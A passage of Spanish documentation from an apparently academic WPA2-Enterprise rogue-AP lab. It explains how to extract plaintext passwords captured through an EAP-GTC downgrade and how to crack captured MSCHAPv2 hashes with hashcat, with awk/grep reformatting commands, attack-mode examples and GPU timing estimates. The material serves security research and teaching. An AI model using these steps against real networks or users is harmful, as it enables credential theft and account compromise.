# Análisis offline de las credenciales capturadas

El laboratorio captura **dos tipos de credenciales** dependiendo del
comportamiento del cliente en el inner EAP de PEAP (ver
[`arquitectura.md`](arquitectura.md) §5 — downgrade GTC):

| Cliente | Captura | Análisis |
|---|---|---|
| Acepta EAP-GTC | **Password en claro** (línea `pap:` en el log) | Ninguno — ya tienes la credencial |
| Rechaza GTC, cae a MSCHAPv2 | **Hash NETNTLM** (línea `mschap:` en el log) | Crack offline (este documento) |
| Rechaza el cert TLS exterior | Nada | El ataque NO funciona contra este cliente |

Este documento cubre el **segundo caso** — recuperar la contraseña a
partir del hash MSCHAPv2 capturado. El primer caso es trivial: la
password ya está en el log.

> La debilidad criptográfica del MSCHAPv2 fue documentada por
> **Moxie Marlinspike y David Hulton en DEFCON 20 (2012)**,
> *"Defeating PPTP VPNs and WPA2 Enterprise with MS-CHAPv2"*.

## Credenciales en claro (caso EAP-GTC)

Si el cliente aceptó GTC, su password aparece literalmente en el log:

```
pap: Wed May 27 19:14:17 2026
    username: alice@uloyola.es
    password: Passw0rd2026
```

Filtrar todas las capturas GTC del log:

```bash
sudo awk '/^pap:/,/^$/' /var/log/freeradius-wpe/freeradius-server-wpe.log
```

No requiere paso adicional. Para el TFG, conviene censurar (`REPLACE_ME`)
estas líneas antes de incluir el log en el documento final.

## Formato del hash capturado

`freeradius-wpe` deja en `/var/log/freeradius-wpe/freeradius-server-wpe.log`
líneas con el siguiente formato, ya listas para `hashcat`:

```
username::challenge:response:peerchallenge
```

Ejemplo (sintético):

```
alice@uloyola.es::0102030405060708:1122334455667788:99aabbccddeeff00
```

Cada campo se separa por `:`:

| Campo | Bytes | Descripción |
|---|---|---|
| `username` | variable | identidad EAP entregada por el cliente |
| `challenge` | 8 (16 hex) | challenge del servidor (`AuthChallenge`) |
| `response` | 24 (48 hex) | respuesta MSCHAPv2 calculada por el cliente sobre NT-hash + challenges |
| `peerchallenge` | 16 (32 hex) | challenge del cliente (`PeerChallenge`) |

## Conversión al formato hashcat (modo 5500)

`hashcat` espera el formato:

```
username::::response:challenge
```

Para ataques contra NetNTLMv1 (que es lo que matemáticamente es la respuesta
MSCHAPv2 una vez extraída del túnel PEAP), el modo es **`-m 5500`**
(`NetNTLMv1 / NetNTLMv1+ESS`).

```bash
# Extraer líneas tipo username::challenge:response:... y reformatearlas
grep -E '^[^:]+::[0-9a-f]{16}:[0-9a-f]{48}:[0-9a-f]{32}' \
     /var/log/freeradius-wpe/freeradius-server-wpe.log \
  | awk -F: '{print $1"::::"$4":"$3}' \
  > hashes-5500.txt
```

## Cracking con hashcat

```bash
# Diccionario (ej.: rockyou.txt — descomprimir antes)
hashcat -m 5500 -a 0 hashes-5500.txt /usr/share/wordlists/rockyou.txt

# Máscara: 8 chars alfanuméricos minúsculas
hashcat -m 5500 -a 3 hashes-5500.txt '?l?l?l?l?l?l?l?l'

# Híbrido: diccionario + 2 dígitos al final
hashcat -m 5500 -a 6 hashes-5500.txt /ruta/wordlist.txt '?d?d'

# Con reglas (best64)
hashcat -m 5500 -a 0 -r /usr/share/hashcat/rules/best64.rule \
        hashes-5500.txt /ruta/wordlist.txt
```

## Tiempos orientativos

Cifras de referencia para una GPU consumer 2023-2024 (RTX 4060 / 4070).
**El laboratorio del TFG no incluye cracking: la captura es el objetivo, el
análisis offline se hace fuera de la Pi.**

| Longitud y conjunto | Combinaciones | RTX 4060 (~50 GH/s) | RTX 4090 (~120 GH/s) |
|---|---|---|---|
| 8 chars `[a-z]` | 2.1·10¹¹ | ~4 s | <2 s |
| 8 chars `[a-zA-Z0-9]` | 2.2·10¹⁴ | ~73 min | ~30 min |
| 10 chars `[a-zA-Z0-9]` | 8.4·10¹⁷ | ~190 días | ~80 días |
| Diccionario rockyou + best64 | 1.4·10⁹ tras reglas | <1 s | <1 s |
| 12 chars `[a-zA-Z0-9!@#$]` | 8.6·10²¹ | ~5400 años | ~2200 años |

Tomar como cota superior la fortaleza de la contraseña del usuario, no la
del algoritmo: MSCHAPv2 con NT-hash es esencialmente DES de 56 bits en tres
operaciones — completamente recuperable con hardware moderado si la
contraseña es débil.

## Herramientas opcionales (no instaladas por defecto)

Para análisis avanzado pueden serle útiles:

```bash
# aircrack-ng — análisis de PCAPs WiFi, no estrictamente necesario aquí
sudo apt install aircrack-ng

# hcxtools / hcxdumptool — conversores y dumpers de hash
sudo apt install hcxtools hcxdumptool

# asleap — recuperación clásica de LEAP/PPTP/MSCHAPv2
sudo apt install asleap

# john (con jumbo) — alternativa a hashcat con soporte de MSCHAPv2
sudo apt install john
```

Ninguno de estos paquetes es instalado por `install.sh` (la captura no los
necesita). Se documentan aquí por completitud.
